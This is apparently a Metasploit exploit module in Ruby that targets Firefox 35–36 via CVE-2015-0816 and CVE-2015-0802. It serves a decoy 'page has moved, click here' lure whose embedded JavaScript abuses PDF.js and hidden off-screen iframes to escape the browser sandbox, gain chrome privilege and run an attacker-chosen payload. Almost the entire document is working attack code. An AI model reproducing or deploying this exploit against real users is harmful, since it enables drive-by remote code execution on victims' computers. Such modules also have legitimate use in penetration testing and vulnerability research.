# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Exploit::Remote::BrowserExploitServer
  include Msf::Exploit::Remote::FirefoxPrivilegeEscalation

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;        => &#039;Firefox PDF.js Privileged Javascript Injection&#039;,
      &#039;Description&#039; => %q{
        This module gains remote code execution on Firefox 35-36 by abusing a
        privilege escalation bug in resource:// URIs. PDF.js is used to exploit
        the bug. This exploit requires the user to click anywhere on the page to
        trigger the vulnerability.
      },
      &#039;Author&#039;         => [
        &#039;Unknown&#039;, # PDF.js injection code was taken from a 0day
        &#039;Marius Mlynski&#039;, # discovery and pwn2own exploit
        &#039;joev&#039;     # copypasta monkey, CVE-2015-0802
      ],
      &#039;DisclosureDate&#039; => "Mar 31 2015",
      &#039;License&#039;     => MSF_LICENSE,
      &#039;References&#039; =>
        [
          [&#039;CVE&#039;, &#039;2015-0816&#039;], # pdf.js can load chrome://
          [&#039;CVE&#039;, &#039;2015-0802&#039;]  # can access messageManager property in chrome window
        ],
      &#039;Targets&#039; => [
        [
          &#039;Universal (Javascript XPCOM Shell)&#039;, {
            &#039;Platform&#039; => &#039;firefox&#039;,
            &#039;Arch&#039; => ARCH_FIREFOX
          }
        ],
        [
          &#039;Native Payload&#039;, {
            &#039;Platform&#039; => %w{ java linux osx solaris win },
            &#039;Arch&#039;     => ARCH_ALL
          }
        ]
      ],
      &#039;DefaultTarget&#039; => 0,
      &#039;BrowserRequirements&#039; => {
        :source  => &#039;script&#039;,
        :ua_name => HttpClients::FF,
        :ua_ver  => lambda { |ver| ver.to_i.between?(35, 36) }
      }
    ))

    register_options([
      OptString.new(&#039;CONTENT&#039;, [ false, "Content to display inside the HTML <body>." ])
    ], self.class)
  end

  def on_request_exploit(cli, request, target_info)
    print_status(&#039;Sending exploit...&#039;)
    send_response_html(cli, html)
  end

  def html
    "<!doctype html><html><body>#{datastore[&#039;CONTENT&#039;] || default_html}"+
    "<script>#{js}</script></body></html>"
  end

  def default_html
    "The page has moved. <span style=&#039;text-decoration:underline;&#039;>Click here</span> to be redirected."
  end

  def js
    key = Rex::Text.rand_text_alpha(5 + rand(12))
    frame = Rex::Text.rand_text_alpha(5 + rand(12))
    r = Rex::Text.rand_text_alpha(5 + rand(12))
    opts = { key => run_payload } # defined in FirefoxPrivilegeEscalation mixin

    <<-EOJS
function xml2string(obj) {
  return new XMLSerializer().serializeToString(obj);
}

function __proto(obj) {
  return obj.__proto__.__proto__.__proto__.__proto__.__proto__.__proto__;
}

function get(path, callback, timeout, template, value) {
  callback = _(callback);
  if (template && value) {
    callback = callback.replace(template, value);
  }
  js_call1 = &#039;javascript:&#039; + _(function() {
    try {
      done = false;
      window.onclick = function() {
        if (done) { return; } done = true;
        q = open("%url%", "q", "chrome,,top=-9999px,left=-9999px,height=1px,width=1px");
        setTimeout(function(){
          q.location=&#039;data:text/html,<iframe mozbrowser src="about:blank"></iframe>&#039;;

            setTimeout(function(){
              var opts = #{JSON.unparse(opts)};
              var key = opts[&#039;#{key}&#039;];
              q.messageManager.loadFrameScript(&#039;data:,&#039;+key, false);
              setTimeout(function(){
                q.close();
              }, 100)
            }, 100)
        }, 100);
      }
    } catch (e) {
      history.back();
    }
    undefined;
  }, "%url%", path);
  js_call2 = &#039;javascript:;try{updateHidden();}catch(e){};&#039; + callback + &#039;;undefined&#039;;
  sandboxContext(_(function() {
    p = __proto(i.contentDocument.styleSheets[0].ownerNode);
    l = p.__lookupSetter__.call(i2.contentWindow, &#039;location&#039;);
    l.call(i2.contentWindow, window.wrappedJSObject.js_call1);
  }));
  setTimeout((function() {
    sandboxContext(_(function() {
      p = __proto(i.contentDocument.styleSheets[0].ownerNode);
      l = p.__lookupSetter__.call(i2.contentWindow, &#039;location&#039;);
      l.call(i2.contentWindow, window.wrappedJSObject.js_call2);
    }));
  }), timeout);
}

function get_data(obj) {
  data = null;
  try {
    data = obj.document.documentElement.innerHTML;
    if (data.indexOf(&#039;dirListing&#039;) < 0) {
      throw new Error();
    }
  } catch (e) {
    if (this.document instanceof XMLDocument) {
        data = xml2string(this.document);
    } else {
      try {
          if (this.document.body.firstChild.nodeName.toUpperCase() == &#039;PRE&#039;) {
              data = this.document.body.firstChild.textContent;
          } else {
              throw new Error();
          }
      } catch (e) {
        try {
          if (this.document.body.baseURI.indexOf(&#039;pdf.js&#039;) >= 0 || data.indexOf(&#039;aboutNetError&#039;) > -1) {;
              return null;
          } else {
              throw new Error();
          }
        } catch (e) {
          ;;
        }
      }
    }
  }
  return data;
}

function _(s, template, value) {
  s = s.toString().split(/^\\s*function\\s+\\(\\s*\\)\\s*\\{/)[1];
  s = s.substring(0, s.length - 1);
  if (template && value) {
    s = s.replace(template, value);
  }
  s += __proto;
  s += xml2string;
  s += get_data;
  s = s.replace(/\\s\\/\\/.*\\n/g, "");
  s = s + ";undefined";
  return s;
}

function get_sandbox_context() {
  if (window.my_win_id == null) {
    for (var i = 0; i < 20; i++) {
      try {
        if (window[i].location.toString().indexOf("view-source:") != -1) {
          my_win_id = i;
          break;
        }
      } catch (e) {}
    }
  };
  if (window.my_win_id == null)
    return;
  clearInterval(sandbox_context_i);
  object.data = &#039;view-source:&#039; + blobURL;
  object.data = &#039;data:text/html,<&#039;+&#039;html/>&#039;;
  window[my_win_id].frameElement.insertAdjacentHTML(&#039;beforebegin&#039;, &#039;<iframe style=&#039;+
    &#039;"position:absolute; left:-9999px;" onload = "&#039;+_(function(){
    window.wrappedJSObject.sandboxContext=(function(cmd) {
      with(importFunction.constructor(&#039;return this&#039;)()) {
        return eval(cmd);
      }
    });
  }) + &#039;"/>&#039;);
}

var HIDDEN = &#039;position:absolute;left:-9999px;height:1px;width:1px;&#039;;
var i = document.createElement("iframe");
i.id = "i";
i.style=HIDDEN;
i.src = "data:application/xml,<?xml version=\\"1.0\\"?><e><e1></e1></e>";
document.documentElement.appendChild(i);
i.onload = function() {
  if (this.contentDocument.styleSheets.length > 0) {
    var i2 = document.createElement("iframe");
    i2.id = "i2";
    i2.style=&#039;opacity: 0;position:absolute;top:0;left:0;right:0;bottom:0;&#039;;
    i2.height = window.innerHeight+&#039;px&#039;;
    i2.width = window.innerWidth+&#039;px&#039;;
    i2.src = "data:application/pdf,";
    document.documentElement.appendChild(i2);
    pdfBlob = new Blob([&#039;&#039;], {
        type: &#039;application/pdf&#039;
    });
    blobURL = URL.createObjectURL(pdfBlob);
    object = document.createElement(&#039;object&#039;);
    object.style=HIDDEN;
    object.data = &#039;data:application/pdf,&#039;;
    object.onload = (function() {
        sandbox_context_i = setInterval(get_sandbox_context, 200);
        object.onload = null;
        object.data = &#039;view-source:&#039; + location.href;
        return;
    });
    document.documentElement.appendChild(object);
  } else {
    this.contentWindow.location.reload();
  }
}

document.body.style.height = window.innerHeight+&#039;px&#039;;

var kill = setInterval(function() {
  if (window.sandboxContext) {
    var f = "chrome://browser/content/browser.xul";
    get(f, function() {}, 0, "%URL%", f);
    clearInterval(kill);
  } else {
    return;
  }
},20);

EOJS
  end
end

